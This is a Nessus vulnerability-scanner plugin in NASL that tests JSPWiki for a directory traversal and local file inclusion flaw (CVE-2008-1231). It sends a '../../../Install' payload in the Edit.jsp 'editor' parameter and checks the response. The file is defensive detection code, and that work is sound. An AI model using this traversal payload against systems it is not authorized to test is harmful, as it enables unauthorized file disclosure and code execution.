#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(57322);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_cve_id("CVE-2008-1231");
  script_bugtraq_id(27785);
  script_osvdb_id(41710);
  script_xref(name:"EDB-ID", value:"5112");

  script_name(english:"JSPWiki Edit.jsp editor Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a JSP script that's affected by a local
file inclusion vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts JSPWiki, an open source WikiWiki engine
built using standard J2EE components.

The installed version of JSPWiki fails to sanitize user input to the
'editor' parameter of the 'Edit.jsp' script of directory traversal
sequences before using it to include and execute an arbitrary local
JSP file.  An unauthenticated, remote attacker could exploit this
issue to disclose sensitive information or execute arbitrary code on
the affected host, subject to the privileges under which the web
server operates.

Note that this install is also likely to be affected by a cross-site
scripting vulnerability, although Nessus has not tested for that."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Feb/198");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to JSPWiki 2.6.1 or later as that is reported to address the
issue."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/02/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/11/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/12/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:8080, embedded:FALSE);


file = 'Install';
exploit = '../../../' + file;


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/JSPWiki", "/wiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
installs = 0;
vuln_urls = make_list();

foreach dir (dirs)
{
  url = dir + '/Edit.jsp?' +
    'page=User&' +
    'editor=' + exploit;
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  # If it looks like JSPWiki's Edit.jsp script...
  if (
    'javascript.quick.edit":"Edit This Section"' >< res[2] ||
    'JSPWiki: Edit: User' >< res[2] ||
    'JSPWiki Edit: User</title>' >< res[2]
  )
  {
    installs++;
  }
  # Otherwise continue unless we're being paranoid.
  else if (report_paranoia < 2)
  {
    continue;
  }

  if (
    'JSPWiki Installer</title>' >< res[2] ||
    'JSPWiki Installer</h1>' >< res[2]
  )
  {
    contents = res[2];
    if (' <div id="editcontent"' >< contents) contents = '[...]\n' + strstr(contents, ' <div id="editcontent"');
    else if ('  <span><a class="activetab" id="menu-editcontent" onclick="TabbedSection.onclick(\'editcontent\')"' >< contents)
      contents = '[...]\n' + strstr(contents, '  <span><a class="activetab" id="menu-editcontent" onclick="TabbedSection.onclick(\'editcontent\')"');

    vuln_urls = make_list(vuln_urls, url);
    if (!thorough_tests) break;
  }
}


if (max_index(vuln_urls))
{
  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1) s = '';
    else s = 's';

    line_limit = 50;
    trailer = '';

    header =
      'Nessus verified the issue by trying to include the application\'s own\n' +
      '\'' + file + '.jsp\' script and verifying the output in the response stream\n' +
      'using the following URL' + s;

    if (report_verbosity > 1)
    {
      trailer =
        'Here is its output (limited to ' + line_limit + ' lines) :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        beginning_of_response(resp:contents, max_lines:line_limit) +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
    }
    report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else
{
  if (installs == 0) exit(0, "No installs of JSPWiki were found on the web server on port "+port+".");
  else if (installs == 1) exit(0, "The JSPWiki install hosted on the web server on port "+port+" is not affected.");
  else exit(0, "The JSPWiki installs hosted on the web server on port "+port+" are not affected.");
}
